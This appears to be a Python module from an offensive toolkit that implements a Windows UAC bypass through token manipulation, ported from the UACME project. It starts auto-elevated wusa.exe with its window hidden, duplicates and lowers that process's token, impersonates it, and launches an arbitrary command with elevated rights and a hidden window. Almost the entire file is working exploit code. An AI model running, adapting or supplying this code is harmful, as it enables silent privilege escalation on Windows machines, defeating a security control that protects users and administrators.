
# Code inspired from the C code of the UACME projet

# Author: CIA & James Forshaw
# Method: Token Manipulations
# Works from: Windows 7 (7600)
# Fixed in: unfixed

from ctypes import (
    c_void_p, c_wchar_p, Structure, POINTER, c_ulong, c_int, c_char_p,
    c_byte, windll, sizeof, addressof, byref, WinError
)
from ctypes.wintypes import (
    HANDLE, BOOL, DWORD, HWND,
    HINSTANCE, HKEY, ULONG, USHORT, LPSTR, WORD
)
from random import randint
import os

# one of these auto elevated process will be used randomly
AUTOELEVATED_EXE                = [
    # 'C:\\Windows\\System32\\Sysprep\\sysprep.exe',    # check with win10
    # 'C:\\Windows\\System32\\winsat.exe',              # check with win10
    'C:\\Windows\\System32\\wusa.exe',
    # 'C:\\Windows\\System32\\oobe\\setupsqm.exe',
    # 'C:\\Windows\\System32\\migwiz\\migwiz.exe',      # check with win10
    # 'C:\\Windows\\System32\\cliconfg.exe'
]

LPVOID                          = c_void_p
PVOID                           = LPVOID
PSID                            = PVOID
LPCWSTR                         = c_wchar_p
LPWSTR                          = c_wchar_p
PWSTR                           = c_wchar_p

TokenImpersonation              = 2
ThreadImpersonationToken        = 5
SecurityImpersonation           = 2
TokenPrimary                    = 1
TokenIntegrityLevel             = 25

SW_SHOW                         = 5
SW_HIDE                         = 0
STARTF_USESHOWWINDOW            = 0x00000001
SEE_MASK_NOCLOSEPROCESS         = 0x00000040
STATUS_SUCCESS                  = 0x00000000L

INVALID_HANDLE_VALUE            = c_void_p(-1).value
SECURITY_MANDATORY_MEDIUM_RID   = 0x00002000L
SE_GROUP_INTEGRITY              = 0x00000020L
LUA_TOKEN                       = 0x4
LOGON_NETCREDENTIALS_ONLY       = 0x00000002

MAXIMUM_ALLOWED                 = 0x02000000L
READ_CONTROL                    = 0x00020000L
STANDARD_RIGHTS_READ            = READ_CONTROL
STANDARD_RIGHTS_REQUIRED        = 0x000F0000L
TOKEN_ASSIGN_PRIMARY            = 0x0001
TOKEN_DUPLICATE                 = 0x0002
TOKEN_IMPERSONATE               = 0x0004
TOKEN_QUERY                     = 0x0008
TOKEN_QUERY_SOURCE              = 0x0010
TOKEN_ADJUST_PRIVILEGES         = 0x0020
TOKEN_ADJUST_GROUPS             = 0x0040
TOKEN_ADJUST_DEFAULT            = 0x0080
TOKEN_ADJUST_SESSIONID          = 0x0100
TOKEN_READ                      = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
tokenprivs                      = (
    TOKEN_QUERY | TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_QUERY_SOURCE | \
    TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | (131072L | 4))
TOKEN_ALL_ACCESS                = (
    STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | \
    TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | \
    TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | \
    TOKEN_ADJUST_SESSIONID)

class UNICODE_STRING(Structure):
    _fields_ = [
        ('Length',          USHORT),
        ('MaximumLength',   USHORT),
        ('Buffer',          PWSTR),
    ]
PUNICODE_STRING = POINTER(UNICODE_STRING)

class ShellExecuteInfo(Structure):
    _fields_ = [
        ('cbSize',          DWORD),
        ('fMask',           c_ulong),
        ('hwnd',            HWND),
        ('lpVerb',          c_char_p),
        ('lpFile',          c_char_p),
        ('lpParameters',    c_char_p),
        ('lpDirectory',     c_char_p),
        ('nShow',           c_int),
        ('hInstApp',        HINSTANCE),
        ('lpIDList',        c_void_p),
        ('lpClass',         c_char_p),
        ('hKeyClass',       HKEY),
        ('dwHotKey',        DWORD),
        ('hIcon',           HANDLE),
        ('hProcess',        HANDLE)
    ]
PShellExecuteInfo = POINTER(ShellExecuteInfo)

class SID_IDENTIFIER_AUTHORITY(Structure):
    _fields_ = [
        ("byte0", c_byte),
        ("byte1", c_byte),
        ("byte2", c_byte),
        ("byte3", c_byte),
        ("byte4", c_byte),
        ("byte5", c_byte),
    ]
PSID_IDENTIFIER_AUTHORITY = POINTER(SID_IDENTIFIER_AUTHORITY)


class SID_AND_ATTRIBUTES(Structure):
    _fields_ = [
        ('Sid',         LPVOID),
        ('Attributes',  DWORD),
    ]

class TOKEN_MANDATORY_LABEL(Structure):
    _fields_ = [
        ('Label', SID_AND_ATTRIBUTES),
    ]
PTOKEN_MANDATORY_LABEL = POINTER(TOKEN_MANDATORY_LABEL)

class SECURITY_QUALITY_OF_SERVICE(Structure):
    _fields_ = [
        ("Length",              DWORD),
        ("ImpersonationLevel",  DWORD),
        ("ContextTrackingMode", DWORD),
        ("EffectiveOnly",       BOOL)
]
PSECURITY_QUALITY_OF_SERVICE = POINTER(SECURITY_QUALITY_OF_SERVICE)

class OBJECT_ATTRIBUTES(Structure):
    _fields_ = [
        ("Length",                      ULONG),
        ("RootDirectory",               HANDLE),
        ("ObjectName",                  PUNICODE_STRING),
        ("Attributes",                  ULONG),
        ("SecurityDescriptor",          PVOID),
        ("SecurityQualityOfService",    PVOID)
]
POBJECT_ATTRIBUTES = POINTER(OBJECT_ATTRIBUTES)


class STARTUPINFO(Structure):
    _fields_ = [
        ('cb',              DWORD),
        ('lpReserved',      LPSTR),
        ('lpDesktop',       LPSTR),
        ('lpTitle',         LPSTR),
        ('dwX',             DWORD),
        ('dwY',             DWORD),
        ('dwXSize',         DWORD),
        ('dwYSize',         DWORD),
        ('dwXCountChars',   DWORD),
        ('dwYCountChars',   DWORD),
        ('dwFillAttribute', DWORD),
        ('dwFlags',         DWORD),
        ('wShowWindow',     WORD),
        ('cbReserved2',     WORD),
        ('lpReserved2',     LPVOID),    # LPBYTE
        ('hStdInput',       HANDLE),
        ('hStdOutput',      HANDLE),
        ('hStdError',       HANDLE),
    ]
PSTARTUPINFO = POINTER(STARTUPINFO)

class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ('hProcess',    HANDLE),
        ('hThread',     HANDLE),
        ('dwProcessId', DWORD),
        ('dwThreadId',  DWORD),
    ]
PPROCESS_INFORMATION = POINTER(PROCESS_INFORMATION)

# shell32

ShellExecuteEx                          = windll.shell32.ShellExecuteExA
ShellExecuteEx.argtypes                 = (PShellExecuteInfo, )
ShellExecuteEx.restype                  = BOOL

# advapi

OpenProcessToken                        = windll.advapi32.OpenProcessToken
OpenProcessToken.argtypes               = (HANDLE, DWORD, POINTER(HANDLE))
OpenProcessToken.restype                = BOOL

DuplicateTokenEx                        = windll.advapi32.DuplicateTokenEx
DuplicateTokenEx.restype                = BOOL
DuplicateTokenEx.argtypes               = [HANDLE, DWORD, POBJECT_ATTRIBUTES, DWORD, DWORD, POINTER(HANDLE)]

CreateProcessWithLogonW                 = windll.advapi32.CreateProcessWithLogonW
CreateProcessWithLogonW.restype         = BOOL
CreateProcessWithLogonW.argtypes        = [LPCWSTR, LPCWSTR, LPCWSTR, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, PSTARTUPINFO, PPROCESS_INFORMATION]

SetTokenInformation                     = windll.advapi32.SetTokenInformation
SetTokenInformation.restype             = BOOL
SetTokenInformation.argtypes            = [HANDLE, DWORD, PTOKEN_MANDATORY_LABEL, DWORD]

# kernel32

GetCurrentThread                        = windll.kernel32.GetCurrentThread
GetCurrentThread.restype                = HANDLE
GetCurrentThread.argtypes               = []

GetStartupInfo                          = windll.kernel32.GetStartupInfoW
GetStartupInfo.restype                  = PVOID
GetStartupInfo.argtypes                 = [PSTARTUPINFO]

CloseHandle                             = windll.kernel32.CloseHandle
CloseHandle.restype                     = BOOL
CloseHandle.argtypes                    = [HANDLE]

# ntdll

RtlAllocateAndInitializeSid             = windll.ntdll.RtlAllocateAndInitializeSid
RtlAllocateAndInitializeSid.restype     = BOOL
RtlAllocateAndInitializeSid.argtypes    = [PSID_IDENTIFIER_AUTHORITY, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, POINTER(PSID)]

NtOpenProcessToken                      = windll.ntdll.NtOpenProcessToken
NtOpenProcessToken.restype              = BOOL
NtOpenProcessToken.argtypes             = [HANDLE, DWORD, POINTER(HANDLE)]

NtSetInformationToken                   = windll.ntdll.NtSetInformationToken
NtSetInformationToken.restype           = BOOL
NtSetInformationToken.argtypes          = [HANDLE, DWORD, PTOKEN_MANDATORY_LABEL, DWORD]

RtlLengthSid                            = windll.ntdll.RtlLengthSid
RtlLengthSid.restype                    = DWORD
RtlLengthSid.argtypes                   = [PSID]

NtFilterToken                           = windll.ntdll.NtFilterToken
NtFilterToken.restype                   = BOOL
NtFilterToken.argtypes                  = [HANDLE, DWORD, PVOID, PVOID, PVOID, POINTER(HANDLE)]

NtDuplicateToken                        = windll.ntdll.NtDuplicateToken
NtDuplicateToken.restype                = BOOL
NtDuplicateToken.argtypes               = [HANDLE, DWORD, POBJECT_ATTRIBUTES, BOOL, DWORD, POINTER(HANDLE)]

NtSetInformationThread                  = windll.ntdll.NtSetInformationThread
NtSetInformationThread.restype          = BOOL
NtSetInformationThread.argtypes         = [HANDLE, DWORD, POINTER(HANDLE), DWORD]

NtClose                                 = windll.ntdll.NtClose
NtClose.restype                         = BOOL
NtClose.argtypes                        = [HANDLE]

NtTerminateProcess                      = windll.ntdll.NtTerminateProcess
NtTerminateProcess.restype              = BOOL
NtTerminateProcess.argtypes             = [HANDLE, DWORD]

RtlFreeSid                              = windll.ntdll.RtlFreeSid
RtlFreeSid.restype                      = PVOID
RtlFreeSid.argtypes                     = [PSID]

def NT_SUCCESS(status):
    return status >= 0

############# main #############

def find_exe_to_use():
    while True:
        method = randint(0, len(AUTOELEVATED_EXE) -1)
        if os.path.exists(AUTOELEVATED_EXE[method]):
            return AUTOELEVATED_EXE[method]
        else:
            del AUTOELEVATED_EXE[method]

        # no auto elevated executable found
        if not AUTOELEVATED_EXE:
            return []

def bypass_uac(autoelevated_exe, lpApplicationName, param):

    ###### Run autoelevated app (any) ######
    shinfo          = ShellExecuteInfo()
    shinfo.cbSize   = sizeof(shinfo)
    shinfo.fMask    = SEE_MASK_NOCLOSEPROCESS
    shinfo.lpFile   = autoelevated_exe
    shinfo.nShow    = SW_HIDE

    if not ShellExecuteEx(byref(shinfo)):
        raise WinError()

    ###### Open token of elevated process. ######

    hProcessToken = HANDLE(INVALID_HANDLE_VALUE)
    if not NT_SUCCESS(NtOpenProcessToken(shinfo.hProcess, MAXIMUM_ALLOWED, byref(hProcessToken))):
        raise WinError()

    ###### Duplicate primary token ######

    sqos                        = SECURITY_QUALITY_OF_SERVICE()
    sqos.Length                 = sizeof(SECURITY_QUALITY_OF_SERVICE)
    sqos.ImpersonationLevel     = SecurityImpersonation
    sqos.ContextTrackingMode    = 0
    sqos.EffectiveOnly          = False

    obja                        = OBJECT_ATTRIBUTES()
    obja.Length                 = sizeof(OBJECT_ATTRIBUTES)
    obja.ObjectName             = None
    obja.Attributes             = 0
    obja.RootDirectory          = None
    obja.SecurityDescriptor     = None
    obja.SecurityQualityOfService = addressof(sqos)

    hTokendupe = HANDLE(INVALID_HANDLE_VALUE)
    if not NT_SUCCESS(DuplicateTokenEx(hProcessToken, TOKEN_ALL_ACCESS, byref(obja), False, TokenPrimary, byref(hTokendupe))):
        raise WinError()

    ###### Lower duplicated token IL from High to Medium. ######

    mlAuthority = SID_IDENTIFIER_AUTHORITY()

    # SECURITY_MANDATORY_LABEL_AUTHORITY
    mlAuthority.byte0 = 0x00
    mlAuthority.byte1 = 0x00
    mlAuthority.byte2 = 0x00
    mlAuthority.byte3 = 0x00
    mlAuthority.byte4 = 0x00
    mlAuthority.byte5 = 0x10

    pIntegritySid = PSID()
    if not NT_SUCCESS(RtlAllocateAndInitializeSid(
            byref(mlAuthority),
            1, SECURITY_MANDATORY_MEDIUM_RID,
            0, 0, 0, 0, 0, 0, 0,
            byref(pIntegritySid))):
        raise WinError()

    tml = TOKEN_MANDATORY_LABEL()
    tml.Label.Attributes = SE_GROUP_INTEGRITY
    tml.Label.Sid = pIntegritySid
    if not NT_SUCCESS(NtSetInformationToken(hTokendupe, TokenIntegrityLevel, byref(tml), sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid))):
        raise WinError()

    ###### Create restricted token. ######

    hLuaToken = HANDLE(INVALID_HANDLE_VALUE)
    if not NT_SUCCESS(NtFilterToken(hTokendupe, LUA_TOKEN, None, None, None, byref(hLuaToken))):
        raise WinError()

    ###### Impersonate logged on user. ######

    hImpToken = HANDLE(INVALID_HANDLE_VALUE)
    if not NT_SUCCESS(DuplicateTokenEx(hLuaToken, TOKEN_IMPERSONATE | TOKEN_QUERY, byref(obja), 2, TokenImpersonation, byref(hImpToken))):
        raise WinError()

    if not NT_SUCCESS(NtSetInformationThread(GetCurrentThread(), ThreadImpersonationToken, byref(hImpToken), sizeof(HANDLE))):
        raise WinError()

    NtClose(hImpToken)
    hImpToken = None

    ###### Run target ######

    pi = PROCESS_INFORMATION()
    si = STARTUPINFO()

    si.cb = sizeof(si)
    GetStartupInfo(byref(si))

    si.dwFlags = STARTF_USESHOWWINDOW
    # si.wShowWindow = SW_SHOW
    si.wShowWindow = SW_HIDE

    bResult = CreateProcessWithLogonW(
                u"uac",
                u"is",
                u"useless",
                LOGON_NETCREDENTIALS_ONLY,
                lpApplicationName,
                param,
                0,
                None,
                None,
                byref(si),
                byref(pi)
            )

    if bResult:
        if pi.hThread:
            CloseHandle(pi.hThread)

        if pi.hProcess:
            CloseHandle(pi.hProcess)

    ######  Revert to self ######

    hImpToken = HANDLE(INVALID_HANDLE_VALUE)
    # should be fixed, the error code return is not correct but does not affect the result so let's continue
    NtSetInformationThread(GetCurrentThread(), ThreadImpersonationToken, byref(hImpToken), sizeof(HANDLE))

    if hImpToken:
        NtClose(hImpToken)

    if hProcessToken:
        NtClose(hProcessToken)

    if hTokendupe:
        NtClose(hTokendupe)

    if hLuaToken:
        NtClose(hLuaToken)

    if shinfo.hProcess:
        NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS)
        NtClose(shinfo.hProcess)

    if pIntegritySid:
        RtlFreeSid(pIntegritySid)

    return True


def run_bypass_uac_using_token_impersonation(cmd, param):

    exe = find_exe_to_use()
    if not exe:
        return False
    else:
        return bypass_uac(exe, cmd, param)
